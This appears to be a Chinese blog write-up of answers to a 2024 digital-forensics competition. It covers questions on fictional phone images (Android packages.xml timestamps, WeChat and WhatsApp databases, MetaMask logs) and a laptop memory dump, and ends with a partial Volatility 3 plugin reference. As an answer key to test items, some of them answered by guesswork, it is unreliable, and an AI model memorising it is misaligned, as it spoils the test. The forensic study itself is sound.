依据你在Emma的手机上找到的照片，你告诉调查员Clara最后的位置是在湾仔的一家酒店。根据你提供的信息，调查员发现Clara在酒店去世，Clara的手机在她的附近，你对Clara的手机进行取证。请根据取证结果回答以下问题｡ 参考Clara_Smartphone.bin，Clara手机的Android操作系统版本是？(1分)</strong><br>A. 8.0.0<br>B. 9.0.0<br>C. 8.1.0<br>D. 7.0.0<br><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/25.png" alt="25"><br><strong>26. [填空题] 参考Clara_Smartphone.bin，Clara手机的版本号(Build Number)是什么？(1分)</strong></p><p>build存在build.prop中，找到</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/26.png" alt="26"></p><p><strong>27. [填空题] 参考Clara_Smartphone.bin，Clara手机的IMEI号码是多少？(答案格式:只填写阿拉伯数字部分) (1分)</strong></p><p><strong>28. [填空题] 参考Clara_Smartphone.bin，Emma的微信账号是？(2分)</strong></p><p>wxid_ltrpgdhvilso22</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/28.png" alt="28"></p><p><strong>29. [单选题] 参考Clara_Smartphone.bin，Clara的第一封电子邮件记录的日期？(2分)</strong><br>A. 2024-07-10<br>B. 2024-07-18<br>C. 2024-07-23<br>D. 2024-07-30<br>A. 2024-07-10<br><strong>30. [单选题] 参考Clara_Smartphone.bin，在通讯录中”David”的联系人信息还包括什么? (2分)</strong><br>A. 出生日期<br>B. LinkedIn<br>C. 电子邮件<br>D. 地址<br>B. LinkedIn<br><strong>31. [单选题] 参考Clara_Smartphone.bin，David和Clara之间通话次数? (2分)</strong><br>A. 0<br>B. 8<br>C. 10<br>D. 24<br><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/31.png" alt="31"><br><strong>32. [单选题] 参考Clara_Smartphone.bin，Clara在Chrome浏览器搜索中哪天使用了关键词”popmart 炒价”? (2分)</strong><br>A. 2024-08-10<br>B. 2024-08-15<br>C. 2024-08-20<br>D. 2024-08-25</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/32.png" alt="32"><strong>33. [单选题] 参考Clara_Smartphone.bin，2024年7月30日共收到多少封电子邮件？(2分)</strong><br>A. 2<br>B. 3<br>C. 4<br>D. 5<br>C. 4<br><strong>34. [填空题] 参考Clara_Smartphone.bin，Clara的Gmail账号是? (2分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/34.png" alt="34"></p><p><strong>35. [单选题] 参考Clara_Smartphone.bin，Clara的手机安装了哪个版本的WhatsApp？(2分)</strong><br>A. 241676000<br>B. 241676001<br>C. 241676004<br>D. 241676007</p><p>C</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/35.png" alt="35"></p><p><strong>36. [填空题] 参考Clara_Smartphone.bin，Clara的WhatsApp账号？(答案格式:只需填写11位阿拉伯数字) (2分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/36.png" alt="36"></p><p><strong>37. [单选题] 参考Clara_Smartphone.bin，Clara的手机在什么时候安装了小红书APP？(2分)</strong><br>A. 2024-07-10<br>B. 2024-07-16<br>C. 2024-07-20<br>D. 2024-07-30<br>这个后来数证杯也考到了；关于packages.xml,这个文件储存的是安装的所有app的基本信息；</p><p>packages.xml文件中主要的信息分为下面几个部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;permission&gt;块: 里面包含了系统中所有定义的权限的信息</span><br><span class="line"></span><br><span class="line">&lt;package&gt;块：里面包含了系统中所有安装的app的详细信息</span><br><span class="line"></span><br><span class="line">&lt;shared-user&gt;块：里面包含了所有系统定义的shareuser的信息</span><br><span class="line"></span><br><span class="line">&lt;keyset-settings&gt;块：里面包含了已安装app签名的public key信息</span><br></pre></td></tr></table></figure><p><package>块里包含了每个app的详细信息，具体说明如下：</package></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- name表示app的包名</span><br><span class="line">- codePath表示这个apk文件存放的位置，如果是系统app, 存在system分区，如果是第三方app, 存在[data分区](https://zhida.zhihu.com/search?content_id=4638513&amp;content_type=Article&amp;match_order=1&amp;q=data分区&amp;zhida_source=entity)</span><br><span class="line">- nativeLibraryPath表示app使用的.so库存放的位置，primaryCpuAbi表示app以哪种abi架构运行</span><br><span class="line">- publicFlags和privateFlags是根据AndroidManifest.xml里的设置，生成的，例如：android:multiarch</span><br><span class="line">- ft表示apk文件上次被更改的时间，it表示app第一次安装的时间，ut表示app上次被更新时间，它的值好像一直和ft相同, ota或app重装之后，这里的ft和ut可能会改变。</span><br><span class="line">- version是app的版本号信息, 也就是在AndroidManifest.xml里配置的android:versioncode</span><br><span class="line">- userId是为app分配的user id, 如果有使用shareUserId, 这里出现的就是SharedUserId。</span><br><span class="line">- &lt;sigs&gt;块里的count表示这个app有多少个签名信息，因为有些app可能会被多个证书签名。&lt;cert&gt;里的index表示这个app使用的证书的序号，当系统发现一个新的证书，这个号就会加1，key是app使用的证书内容的ascii码值。</span><br><span class="line">  PKMS在扫apk文件过程中，如果发现它和之前扫描到的apk使用的是相同的[签名证书](https://zhida.zhihu.com/search?content_id=4638513&amp;content_type=Article&amp;match_order=1&amp;q=签名证书&amp;zhida_source=entity)，这里就只会有个index的值，并没有key的值。拥有相同的index的package, 表明它们使用的是相同的签名</span><br><span class="line">- &lt;perms&gt;块里是这个app拥有的权限, 对于一般的app，这些权限是在AndroidManifest.xml里写明的；那些使用了相同UID的app, 这里的权限就是所有使用相同UID的app申请的权限的总和。 granted表示这个权限是不是已经被允许。</span><br><span class="line">- &lt;proper-signing-keyset&gt;里的identifier就是上面说的&lt;keysets&gt;里identifier的值。它是用来标明这个app使用的是哪个公钥。</span><br></pre></td></tr></table></figure><p>找到packages.xml然后找到小红书的package部分，it值是十六进制的，先转化为十进制在从时间戳转化为UTC时间</p><p>Tue 16 July 2024 08:50:23.173 UTC→B</p><p><strong>38. [单选题] 参考Clara_Smartphone.bin，2024年8月21日David的虚拟貨幣钱包里有多少IDFC？(3分)</strong><br>A. 5022915.66<br>B. 3212695.22<br>C. 210355633.91<br>D. 以上皆不是<br>这题不是第一次出现了，IDFC上面的题出现过，为此特意看了一下时间，就是8月21，所以还是A<br><strong>39. [填空题] 参考Clara_Smartphone.bin，Clara注册的微信账号验证码是多少？(2分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/39.png" alt="39"></p><p><strong>40. [填空题] 参考Clara_Smartphone.bin，David为庆祝结婚周年纪念预订了哪家酒店？提示:请使用大写英文字母作答，例如:HONG KONG HOTEL) (3分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/40-1.png" alt="40-1"></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/40-2.png" alt="40-2"></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/40-3.png" alt="40-3"></p><p><strong>41. [填空题] 参考Clara_Smartphone.bin，哪个数据库文件存储了微信消息？(答案格式:只需使用全部大写回答, 例如:ABC.DB) (3分)</strong></p><p>ENMICROMSG.DB常识题，也可以追踪聊天记录的源文件获得答案</p><p><strong>42. [填空题] 参考Clara_Smartphone.bin，哪个数据库文件(.db)存储了WhatsApp訊息？(3分)</strong></p><p>同上，是MSGSTORE.DB(Whatsapp居然是不加密的吗)</p><p><strong>43. [单选题] 参考Clara_Smartphone.bin，Clara在2024年8月29日拍了多少张照片？(2分)</strong><br>A. 0<br>B. 3<br>C. 4<br>D. 5<br>找DCIM文件夹，里面是拍的照片，照片是以时间命名的，29号3张</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/43.png" alt="43"></p><p><strong>44. [单选题] 参考Clara_Smartphone.bin，Emma在2024年8月6日通过微信发送了多少张照片给Clara? (2分)</strong><br>A. 0<br>B. 1<br>C. 5<br>D. 12</p><p>6号没有图，这是筛选后只剩下的图片消息</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/44.png" alt="image-20241231173201269"><br><strong>45. [填空题] 参考Clara_Smartphone.bin，照片20240829_144717.jpg的拍摄相机型号是什么？(2分)</strong></p><p>这个照片也在dcim里面，导出查看属性是LG-H930</p><p><strong>46. [单选题] 参考Clara_Smartphone.bin，20240821_121435.jpg的储存路径是什么？(2分)</strong><br>A. &#x2F;media&#x2F;0&#x2F;DCIM&#x2F;Camera<br>B. &#x2F;media&#x2F;1&#x2F;DCIM&#x2F;Camera<br>C. &#x2F;media&#x2F;00&#x2F;DCIM&#x2F;Camera<br>D. &#x2F;media&#x2F;11&#x2F;DCIM&#x2F;Camera<br>同上题文件夹，A</p><p><strong>47. [填空题] 参考Clara_Smartphone.bin，2024年8月20日有多少张截图？(2分)</strong></p><p>搜索screenshot找到截图文件夹</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/47.png" alt="image-20241231174127378"></p><p>4</p><p><strong>48. [单选题] 参考Clara_Smartphone.bin，2024年8月22日被删除微信消息的类型是？(3分)</strong><br>A. 照片<br>B. 视频<br>C. 文本<br>D. 以上都不是<br>这里是分析聊天记录得出的，我找找看下面肯定是有一张图片，而且应该是recover seed的照片，这里有逻辑上的断层，所以应该是删了照片，A</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/48.png" alt="48"><strong>49. [填空题] 你在查看Clara的手机镜像后，确定Clara是David的妻子，调查员通过查询酒店预订记录确认了这一点。他们现在定位David的住所，以进行进一步调查。你首先分析David的手机。参考David_Smartphone_1.zip，根据Contents.db，David手机接收了通讯软件”Telegram”的验证短信，该验证码是多少？(3分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/49.png" alt="49"></p><p><strong>50. [填空题] 参考David_Smartphone_1.zip，David把手机设置为个人热点，请找出个人热点的密码。(3分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/50.png" alt="50"></p><p><strong>51. [判断题] 参考David_Smartphone_1.zip, David 手机曾连接名为”MTR Free Wi-Fi” 的Wi-Fi ｡ (2分)</strong></p><p>是</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/51.png" alt="51"></p><p><strong>52. [填空题] 参考David_Smartphone_1.zip，根据com.tencent.mm_preferences.xml，David的手机最后登录微信的微信ID是？(3分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/52.png" alt="52"></p><p><strong>53. [填空题] 参考David_Smartphone_1.zip，请指出哪一张图片是于2024年8月28日利用屏幕截取的。(答案格式:ABC_123.jpg) (3分)</strong></p><p>Screenshot_20240828-153836_Gmail.jpg</p><p>还是搜索screenshot找截图文件夹</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/53.png" alt="53"></p><p><strong>54. [填空题] 参考 David_Smartphone_1.zip，根据Contents.db，David手机的型号(Model)？(答案格式:大写英文字母和符号’-‘ 混合组成) (2分)</strong></p><p>找到表system_info</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/54.png" alt="54"></p><p><strong>55. [填空题] 参考 David_Smartphone_1.zip的Contents.db，David所使用的手机SIM 卡的序号？(答案格式:只需要用阿拉伯数目字回答) (1分)</strong></p><p>上面那个serialnumber就是</p><p><strong>56. [填空题] 参考 David_Smartphone_1.zip，David手机安装了应用程序”MetaMask”。根据persist-root中，”MetaMask”钱包内有多少个账号？(3分)</strong></p><p>4个，在文件里面搜Account发现Account 1、2、3、 4</p><p><strong>57. [单选题] 参考 David_Smartphone_1.zip，根据persist-root中，何时从应用程序”MetaMask”发送虚拟货币至以下地址: 0X10A4F01B80203591CCEE76081A4489AE1CD1281C (3分)</strong><br>A. 2024-08-11 1249(GMT+8)<br>B. 2024-08-14 1658 (GMT+8)<br>C. 2024-08-14 1659 (GMT+8)<br>D. 2024-08-16 1724 (GMT+8)</p><p>搜索地址找到对应时间戳是1723625933421，UTC+8恰好对应B</p><p><strong>58. [单选题] 参考 David_Smartphone_1.zip，David曾利用手机应用程序”MetaMask”三次发送虚拟货币失败。根据persist-root，发送虚拟货币失败的原因是什麼？(3分)</strong><br>A. 网络连接问题<br>B. 应用程序权限被拒<br>C. 接收地址错误<br>D. 手续费不足<br>文件内搜索fail刚好就是三个，对应三次失败。然后每个fail下面都有message</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/58.png" alt="58"></p><p>显示余额不足，不足以支付gas燃料和交易本身，也就是说手续费不够咯，因为这个gas燃料是给矿工的。</p><p><strong>59. [单选题] 你根据易失性(Volatility Level)优先次序，进行内存取证分析David的笔记本电脑。参考RAM_Capture_David_Laptop.RAW，以下哪一个不是程序”firefox.exe”的PID？(2分)</strong><br>A. 9240<br>B. 8732<br>C. 5260<br>D. 3108<br><strong>C</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/59.png" alt="59"></p><p>这里60~61题vol不太行，时间不够调了，就先跳过，迟一点搞</p><p>2025-1-12 12:14更新60~61—————————————————————————————————————————————————————————</p><p>MemProcFS：</p><p>volatility3：关于符号表：github上面搜volatility，会有现成的符号表给下载的，vol3的符号表压缩包下载好之后直接放在volatility3-develop&#x2F;volatility3&#x2F;symbols&#x2F;这个位置就可以，vol3会自动解压符号表的压缩包的，然后关于其用法总结如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line">Plugins:</span><br><span class="line">  For plugin specific options, run &#x27;volatility &lt;plugin&gt; --help&#x27;</span><br><span class="line"></span><br><span class="line">plugin</span><br><span class="line">    banners.Banners     查找镜像中潜在的linux系统信息</span><br><span class="line">    configwriter.ConfigWriter</span><br><span class="line">                        执行automagic，并输出到输出文件夹，同时在命令行里回显</span><br><span class="line">    automagic：（来自官方文档，大意如下）总的来说，有一些设定好的任务可以在插件运行之前运行，以作好前置准备，省得人工实行一些重复且易出错的步骤，这些就  是Automagic。它们可以获取自动加载原始内存镜像并获取Intel 转换层和准确的符号表，然后提供给插件，而无需插件或调用程序指定所有必要的详细信息。</span><br><span class="line">    frameworkinfo.FrameworkInfo</span><br><span class="line">                        列出volatility的插件框架，包括automagic</span><br><span class="line">    isfinfo.IsfInfo     这个好像是列出当前可用的符号文件</span><br><span class="line">    layerwriter.LayerWriter</span><br><span class="line">                        应该是运行了automagic之后把数据写进内存页里，下次就不需要再重复运行automagic了</span><br><span class="line">linux&amp;mac：</span><br><span class="line">linux.bash.Bash                                 Recovers bash command history from memory.</span><br><span class="line">linux.check_afinfo.Check_afinfo                 Verifies the operation function pointers of network protocols.</span><br><span class="line">linux.check_creds.Check_creds                   Checks if any processes are sharing credential structures</span><br><span class="line">linux.check_idt.Check_idt                       Checks if the IDT has been altered</span><br><span class="line">linux.check_modules.Check_modules               Compares module list to sysfs info, if available</span><br><span class="line">linux.check_syscall.Check_syscall               Check system call table for hooks.</span><br><span class="line">linux.elfs.Elfs                                 Lists all memory mapped ELF files for all processes.</span><br><span class="line">linux.keyboard_notifiers.Keyboard_notifiers     Parses the keyboard notifier call chain</span><br><span class="line">linux.lsmod.Lsmod                               Lists loaded kernel modules.</span><br><span class="line">linux.lsof.Lsof                                 Lists all memory maps for all processes.</span><br><span class="line">linux.malfind.Malfind                           Lists process memory ranges that potentially contain injected code.</span><br><span class="line">linux.proc.Maps                                 Lists all memory maps for all processes.</span><br><span class="line">linux.pslist.PsList                             Lists the processes present in a particular linux memory image.</span><br><span class="line">linux.pstree.PsTree                             Plugin for listing processes in a tree based on their parent process ID.</span><br><span class="line">linux.tty_check.tty_check                       Checks tty devices for hooks</span><br><span class="line">mac.bash.Bash                                   Recovers bash command history from memory.</span><br><span class="line">mac.check_syscall.Check_syscall                 Check system call table for hooks.</span><br><span class="line">mac.check_sysctl.Check_sysctl                   Check sysctl handlers for hooks.</span><br><span class="line">mac.check_trap_table.Check_trap_table           Check mach trap table for hooks.</span><br><span class="line">mac.ifconfig.Ifconfig                           Lists loaded kernel modules</span><br><span class="line">mac.kauth_listeners.Kauth_listeners             Lists kauth listeners and their status</span><br><span class="line">mac.kauth_scopes.Kauth_scopes                   Lists kauth scopes and their status</span><br><span class="line">mac.kevents.Kevents                             Lists event handlers registered by processes</span><br><span class="line">mac.list_files.List_Files                       Lists all open file descriptors for all processes.</span><br><span class="line">    mac.lsmod.Lsmod                                 Lists loaded kernel modules.</span><br><span class="line">mac.lsof.Lsof                                   Lists all open file descriptors for all processes.</span><br><span class="line">mac.malfind.Malfind                             Lists process memory ranges that potentially contain injected code.</span><br><span class="line">mac.mount.Mount                                 A module containing a collection of plugins that produce data typically foundin Mac&#x27;s mount command</span><br><span class="line">mac.netstat.Netstat                             Lists all network connections for all processes.</span><br><span class="line">    mac.proc_maps.Maps                              Lists process memory ranges that potentially contain injected code.</span><br><span class="line">mac.psaux.Psaux                                 Recovers program command line arguments.</span><br><span class="line">mac.pslist.PsList                               Lists the processes present in a particular mac memory image.</span><br><span class="line">mac.pstree.PsTree                               Plugin for listing processes in a tree based on their parent process ID.</span><br><span class="line">mac.socket_filters.Socket_filters               Enumerates kernel socket filters.</span><br><span class="line">mac.timers.Timers                               Check for malicious kernel timers.</span><br><span class="line">    mac.trustedbsd.Trustedbsd                       Checks for malicious trustedbsd modules</span><br><span class="line">    mac.vfsevents.VFSevents                         Lists processes that are filtering file system events</span><br><span class="line">    timeliner.Timeliner</span><br><span class="line">                        Runs all relevant plugins that provide time related information and orders the results by</span><br><span class="line">                        time.运行所有和时间有关系的插件，列出所有和时间相关的信息；</span><br><span class="line">windows：</span><br><span class="line">    windows.bigpools.BigPools</span><br><span class="line">                        内存大页池；内存是分页的，每一个页都有固定大小，这个功能可以看到大一些的内存分页，输出参数为：Allocation、Tag         PoolType、NumberOfBytes 、Status，可以看到其虚拟地址，标签，大小和是否被分配等情况。</span><br><span class="line">    windows.cachedump.Cachedump</span><br><span class="line">                        提取注册表中的域缓存哈希</span><br><span class="line">    windows.callbacks.Callbacks</span><br><span class="line">                        